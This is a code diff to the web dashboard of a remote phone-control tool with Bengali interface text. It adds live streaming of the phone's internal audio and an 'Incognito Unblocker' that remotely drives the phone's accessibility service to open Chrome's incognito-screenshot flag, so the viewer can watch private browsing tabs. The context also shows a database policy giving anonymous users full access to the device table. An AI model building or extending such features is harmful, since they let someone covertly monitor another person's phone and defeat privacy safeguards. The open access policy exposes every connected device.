@@ -366,6 +366,7 @@
 
           <!-- Video / Image Stream Container -->
           <div class="viewport-box" id="viewport">
+            <audio id="remoteAudio" autoplay playsinline style="display:none;"></audio>
             <video id="remoteVideo" autoplay playsinline muted style="display:none; width:100%; height:100%; object-fit:contain;"></video>
             <video id="mobile-screen-video" autoplay playsinline muted style="display:none; width:100%; height:100%; object-fit:contain;"></video>
             <canvas id="mobile-screen-canvas" style="display:none; width:100%; height:100%; object-fit:contain;"></canvas>
@@ -467,6 +468,47 @@
             </div>
           </div>
 
+          <!-- Real-Time Mobile Audio Card -->
+          <div class="card" style="border: 1px solid rgba(56, 189, 248, 0.4);">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+              <h3 style="font-size:14px; display:flex; align-items:center; gap:8px; color:#38bdf8;">
+                <span>🔊 Live Phone Audio</span>
+              </h3>
+              <span id="audio-status-badge" class="badge" style="background:rgba(100,116,139,0.2); color:#94a3b8; font-size:10px;">
+                AUDIO MUTED
+              </span>
+            </div>
+
+            <p style="font-size:11px; color:#94a3b8; margin-bottom:10px; line-height:15px;">
+              মোবাইলের ভেতরের গান, ভিডিও বা যে কোনো সাউন্ড একদম জিরো ল্যাটেক্সিতে শুনুন:
+            </p>
+
+            <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:10px;">
+              <button id="btn-toggle-audio" class="btn btn-action" onclick="toggleAudioStreaming()" style="padding:7px 12px; font-size:12px; border-color:#38bdf8; color:#38bdf8;">
+                🔇 Audio: MUTED (Click to Listen)
+              </button>
+              
+              <div style="display:flex; align-items:center; gap:6px; flex:1; min-width:140px;">
+                <span style="font-size:11px; color:#94a3b8;">Vol:</span>
+                <input type="range" id="audio-volume-slider" min="0" max="100" value="100" oninput="changeAudioVolume(this.value)" style="flex:1; accent-color:#38bdf8; cursor:pointer;">
+                <span id="audio-volume-text" style="font-size:11px; font-family:monospace; color:#38bdf8; width:35px;">100%</span>
+              </div>
+            </div>
+
+            <!-- Live Audio Visualizer Equalizer Bar -->
+            <div style="display:flex; align-items:center; justify-content:space-between; background:#090d16; padding:6px 10px; border-radius:6px; border:1px solid #1e293b;">
+              <span style="font-size:10px; color:#64748b;">Live Sound Monitor:</span>
+              <div id="audio-visualizer-container" style="display:flex; align-items:flex-end; gap:3px; height:16px;">
+                <div class="eq-bar" style="width:4px; height:3px; background:#38bdf8; border-radius:2px; transition:height 0.08s;"></div>
+                <div class="eq-bar" style="width:4px; height:5px; background:#38bdf8; border-radius:2px; transition:height 0.08s;"></div>
+                <div class="eq-bar" style="width:4px; height:3px; background:#38bdf8; border-radius:2px; transition:height 0.08s;"></div>
+                <div class="eq-bar" style="width:4px; height:6px; background:#34d399; border-radius:2px; transition:height 0.08s;"></div>
+                <div class="eq-bar" style="width:4px; height:4px; background:#34d399; border-radius:2px; transition:height 0.08s;"></div>
+                <div class="eq-bar" style="width:4px; height:6px; background:#38bdf8; border-radius:2px; transition:height 0.08s;"></div>
+              </div>
+            </div>
+          </div>
+
           <!-- Quick Controls -->
           <div class="card">
             <h3 style="font-size:14px; margin-bottom:10px;">Quick Actions</h3>
@@ -475,6 +517,8 @@
               <button class="btn-action" onclick="requestImmediateKeyframe()">⚡ Sync I-Frame</button>
               <button class="btn-action" onclick="sendCloudCommand({type:'ring_device'})">🔔 Ring Device</button>
               <button class="btn-action" onclick="wakeDeviceScreen()">💡 Wake Display</button>
+              <button class="btn-action" style="border-color:#a855f7; color:#c084fc;" onclick="unblockIncognitoMode()">🕶️ Incognito Guide</button>
+              <button id="btn-quick-audio" class="btn-action" style="border-color:#38bdf8; color:#38bdf8;" onclick="toggleAudioStreaming()">🔊 Audio: OFF</button>
             </div>
           </div>
 
@@ -548,6 +592,43 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
     ON public.hosts FOR ALL
     TO anon, authenticated
     USING (true) WITH CHECK (true);</pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- INCOGNITO MODE GUIDE MODAL -->
+  <div id="incognito-modal" class="modal-overlay">
+    <div class="modal-card" style="max-width:500px;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
+        <h3 style="font-size:17px; color:#c084fc; display:flex; align-items:center; gap:8px;">
+          <span>🕶️ Incognito / Private Tab Unblocker</span>
+        </h3>
+        <button class="btn-action" style="padding:4px 8px;" onclick="closeIncognitoModal()">✕</button>
+      </div>
+
+      <p style="font-size:13px; color:#cbd5e1; margin-bottom:12px; line-height:19px;">
+        Android সিস্টেমে Google Chrome এবং অন্যান্য ব্রাউজার ডিফল্টভাবে ইনকগনিটো মোডে স্ক্রিন ক্যাপচার ব্লক (Black Screen) করে রাখে।
+      </p>
+
+      <div style="background:#181028; border:1px solid #7c3aed; border-radius:10px; padding:12px; margin-bottom:14px;">
+        <strong style="color:#e9d5ff; font-size:13px; display:block; margin-bottom:6px;">
+          ⚡ ১-ক্লিকে ইনকগনিটো স্ক্রিন চালু করার উপায়:
+        </strong>
+        <ol style="margin-left:20px; font-size:12px; color:#d8b4fe; line-height:20px;">
+          <li>নিচের <strong>"Open Chrome Settings on Phone"</strong> বাটনে ক্লিক করুন।</li>
+          <li>ফোনে ক্রোম খুললে <strong>"Settings (⚙️) ➔ Privacy and security"</strong>-তে যান।</li>
+          <li><strong>"Incognito screenshot"</strong> অপশনটি চালু (ON) করে দিন!</li>
+          <li>ব্যাস! সাথে সাথে এই ওয়েবসাইটে ইনকগনিটো ট্যাবের লাইভ স্ক্রিন ভেসে উঠবে।</li>
+        </ol>
+      </div>
+
+      <div style="display:flex; gap:10px;">
+        <button class="btn btn-action" style="flex:1; justify-content:center;" onclick="closeIncognitoModal()">
+          Close
+        </button>
+        <button class="btn btn-primary" style="flex:1.5; justify-content:center; background:#8b5cf6; color:white;" onclick="triggerPhoneIncognitoUnblock()">
+          🚀 Open Chrome Settings on Phone
+        </button>
       </div>
     </div>
   </div>
@@ -702,6 +783,13 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
     let activeSessionId = null;
     let processedHostCandidateSet = new Set();
     let isWebRtcActive = false;
+
+    // Real-Time Audio Streaming State
+    let isAudioEnabled = false;
+    let audioCtx = null;
+    let audioGainNode = null;
+    let audioNextPlayTime = 0;
+    let audioVolume = 0.8;
 
     // Auto-discover online devices
     async function discoverOnlineDevices() {
@@ -1341,16 +1429,26 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
         };
 
         rtcPeerConnection.ontrack = (event) => {
-          const remoteVideo = document.getElementById("remoteVideo");
-          if (remoteVideo && event.streams && event.streams[0]) {
-            remoteVideo.srcObject = event.streams[0];
-            remoteVideo.style.display = "block";
-            remoteVideo.onloadedmetadata = () => {
-              if (remoteVideo.videoWidth > 0 && remoteVideo.videoHeight > 0) {
-                updateViewportAspectRatio(remoteVideo.videoWidth, remoteVideo.videoHeight);
+          if (event.track.kind === "video") {
+            const remoteVideo = document.getElementById("remoteVideo");
+            if (remoteVideo && event.streams && event.streams[0]) {
+              remoteVideo.srcObject = event.streams[0];
+              remoteVideo.style.display = "block";
+              remoteVideo.onloadedmetadata = () => {
+                if (remoteVideo.videoWidth > 0 && remoteVideo.videoHeight > 0) {
+                  updateViewportAspectRatio(remoteVideo.videoWidth, remoteVideo.videoHeight);
+                }
+              };
+              document.getElementById("mobile-screen-img").style.display = "none";
+            }
+          } else if (event.track.kind === "audio") {
+            const remoteAudio = document.getElementById("remoteAudio");
+            if (remoteAudio && event.streams && event.streams[0]) {
+              remoteAudio.srcObject = event.streams[0];
+              if (isAudioEnabled) {
+                remoteAudio.play().catch(_ => {});
               }
-            };
-            document.getElementById("mobile-screen-img").style.display = "none";
+            }
           }
         };
 
@@ -1359,7 +1457,7 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
 
         const offer = await rtcPeerConnection.createOffer({
           offerToReceiveVideo: true,
-          offerToReceiveAudio: false
+          offerToReceiveAudio: true
         });
         await rtcPeerConnection.setLocalDescription(offer);
 
@@ -1386,6 +1484,10 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
         if (onConnectedCallback) onConnectedCallback();
         startWebRtcPing();
         if (activeMode) switchLatencyMode(activeMode);
+        if (isAudioEnabled) {
+          sendCloudCommand({ type: "start_audio" });
+          sendCloudCommand({ type: "set_audio_muted", muted: false });
+        }
       };
       dc.onclose = () => {
         isWebRtcActive = false;
@@ -1410,6 +1512,13 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
                 img.style.display = "block";
                 if (oldUrl && oldUrl.startsWith("blob:")) URL.revokeObjectURL(oldUrl);
               }
+            } else if (bytes.length > 7 && bytes[0] === 3) {
+              // High-speed low-latency Audio PCM frame
+              const view = new DataView(event.data);
+              const sampleRate = view.getInt32(1, true);
+              const channels = view.getInt16(5, true);
+              const pcmData = new Int16Array(event.data.slice(7));
+              handleIncomingPcmAudio(pcmData, sampleRate, channels);
             }
           } else if (typeof event.data === "string") {
             const msg = JSON.parse(event.data);
@@ -1498,7 +1607,201 @@ CREATE POLICY "Allow public anon full access for mobile remote host"
       }
     };
 
+    // --- REAL-TIME AUDIO STREAMING ENGINE (Ultra Low-Latency Web Audio API) ---
+    function initAudioEngine() {
+      if (!audioCtx) {
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (AudioContextClass) {
+          audioCtx = new AudioContextClass({ latencyHint: "interactive" });
+          audioGainNode = audioCtx.createGain();
+          audioGainNode.gain.value = audioVolume;
+          audioGainNode.connect(audioCtx.destination);
+          audioNextPlayTime = audioCtx.currentTime;
+        }
+      }
+      if (audioCtx && audioCtx.state === "suspended") {
+        audioCtx.resume();
+      }
+    }
+
+    function toggleAudioStreaming() {
+      isAudioEnabled = !isAudioEnabled;
+      const btn = document.getElementById("btn-toggle-audio");
+      const quickBtn = document.getElementById("btn-quick-audio");
+      const statusEl = document.getElementById("audio-status-indicator");
+      const remoteAudio = document.getElementById("remoteAudio");
+
+      if (isAudioEnabled) {
+        initAudioEngine();
+        if (btn) {
+          btn.innerHTML = "<span>🔊</span> Mute";
+          btn.style.borderColor = "#ef4444";
+          btn.style.color = "#ef4444";
+        }
+        if (quickBtn) {
+          quickBtn.textContent = "🔊 Audio: ON";
+          quickBtn.style.color = "#34d399";
+          quickBtn.style.borderColor = "#34d399";
+        }
+        if (statusEl) {
+          statusEl.textContent = "● Live Audio Streaming";
+          statusEl.style.color = "#34d399";
+        }
+        if (remoteAudio && remoteAudio.srcObject) {
+          remoteAudio.play().catch(_ => {});
+        }
+        // Tell phone host to start capture & unmute
+        sendCloudCommand({ type: "start_audio" });
+        sendCloudCommand({ type: "set_audio_muted", muted: false });
+      } else {
+        if (btn) {
+          btn.innerHTML = "<span>🔈</span> Unmute";
+          btn.style.borderColor = "#38bdf8";
+          btn.style.color = "#38bdf8";
+        }
+        if (quickBtn) {
+          quickBtn.textContent = "🔈 Audio: OFF";
+          quickBtn.style.color = "#94a3b8";
+          quickBtn.style.borderColor = "#475569";
+        }
+        if (statusEl) {
+          statusEl.textContent = "○ Audio Muted";
+          statusEl.style.color = "#94a3b8";
+        }
+        resetVisualizerBars();
+        if (remoteAudio) {
+          remoteAudio.pause();
+        }
+        // Tell phone host to mute
+        sendCloudCommand({ type: "set_audio_muted", muted: true });
+      }
+    }
+    window.toggleAudioStreaming = toggleAudioStreaming;
+
+    function changeAudioVolume(val) {
+      audioVolume = parseFloat(val);
+      const valEl = document.getElementById("audio-volume-val");
+      if (valEl) valEl.textContent = Math.round(audioVolume * 100) + "%";
+      if (audioGainNode && audioCtx) {
+        audioGainNode.gain.setValueAtTime(audioVolume, audioCtx.currentTime);
+      }
+      const remoteAudio = document.getElementById("remoteAudio");
+      if (remoteAudio) {
+        remoteAudio.volume = audioVolume;
+      }
+    }
+    window.changeAudioVolume = changeAudioVolume;
+
+    function handleIncomingPcmAudio(pcmData, sampleRate, channels) {
+      if (!isAudioEnabled) return;
+      initAudioEngine();
+      if (!audioCtx || audioCtx.state !== "running") return;
+
+      const numChannels = channels || 1;
+      const numFrames = Math.floor(pcmData.length / numChannels);
+      if (numFrames <= 0) return;
+
+      const audioBuffer = audioCtx.createBuffer(numChannels, numFrames, sampleRate);
+      let sumSquares = 0;
+
+      for (let ch = 0; ch < numChannels; ch++) {
+        const channelData = audioBuffer.getChannelData(ch);
+        for (let i = 0; i < numFrames; i++) {
+          const sample = pcmData[i * numChannels + ch] / 32768.0;
+          channelData[i] = sample;
+          if (ch === 0) sumSquares += sample * sample;
+        }
+      }
+
+      // Calculate RMS for visualizer
+      const rms = Math.sqrt(sumSquares / numFrames);
+      animateVisualizerBars(rms);
+
+      const sourceNode = audioCtx.createBufferSource();
+      sourceNode.buffer = audioBuffer;
+      sourceNode.connect(audioGainNode);
+
+      const currentTime = audioCtx.currentTime;
+      // Ultra-low latency scheduling with 15ms lead jitter buffer
+      if (audioNextPlayTime < currentTime) {
+        audioNextPlayTime = currentTime + 0.015;
+      }
+      sourceNode.start(audioNextPlayTime);
+      audioNextPlayTime += audioBuffer.duration;
+    }
+    window.handleIncomingPcmAudio = handleIncomingPcmAudio;
+
+    function animateVisualizerBars(rms) {
+      const bars = [
+        document.getElementById("eq-bar-1"),
+        document.getElementById("eq-bar-2"),
+        document.getElementById("eq-bar-3"),
+        document.getElementById("eq-bar-4"),
+        document.getElementById("eq-bar-5"),
+        document.getElementById("eq-bar-6")
+      ];
+      const scaled = Math.min(1.0, rms * 5.0);
+      bars.forEach((bar, idx) => {
+        if (!bar) return;
+        const variation = 0.4 + 0.6 * Math.sin(Date.now() / 80 + idx * 1.2);
+        const heightPct = Math.max(15, Math.min(100, Math.round(scaled * variation * 100)));
+        bar.style.height = heightPct + "%";
+        if (scaled > 0.08) {
+          bar.style.background = "#38bdf8";
+        } else {
+          bar.style.background = "#475569";
+        }
+      });
+    }
+
+    function resetVisualizerBars() {
+      for (let i = 1; i <= 6; i++) {
+        const b = document.getElementById("eq-bar-" + i);
+        if (b) {
+          b.style.height = "15%";
+          b.style.background = "#475569";
+        }
+      }
+    }
+
+    // --- INCOGNITO SCREEN VIEWER & UNBLOCKER ---
+    function unblockIncognitoMode() {
+      const modal = document.getElementById("incognito-modal");
+      if (modal) modal.style.display = "flex";
+    }
+    window.unblockIncognitoMode = unblockIncognitoMode;
+
+    function closeIncognitoModal() {
+      const modal = document.getElementById("incognito-modal");
+      if (modal) modal.style.display = "none";
+    }
+    window.closeIncognitoModal = closeIncognitoModal;
+
+    function triggerPhoneIncognitoUnblock() {
+      // Send command to phone accessibility service to open chrome://flags/#incognito-screenshot
+      sendCloudCommand({ type: "unblock_incognito" });
+      const hint = document.getElementById("incognito-remote-status");
+      if (hint) {
+        hint.style.display = "block";
+        hint.textContent = "🚀 Opening Chrome Incognito Settings on phone screen now...";
+      }
+      setTimeout(() => {
+        if (hint) {
+          hint.textContent = "✅ Phone opened Chrome settings! Enable 'Incognito screenshot' and restart Chrome.";
+        }
+      }, 2000);
+    }
+    window.triggerPhoneIncognitoUnblock = triggerPhoneIncognitoUnblock;
+
     function logout() {
+      if (isAudioEnabled) {
+        toggleAudioStreaming();
+      }
+      if (audioCtx) {
+        try { audioCtx.close(); } catch(_) {}
+        audioCtx = null;
+        audioGainNode = null;
+      }
       if (screenPollInterval) clearInterval(screenPollInterval);
       if (signalingPollInterval) clearInterval(signalingPollInterval);
       if (webrtcPingInterval) clearInterval(webrtcPingInterval);
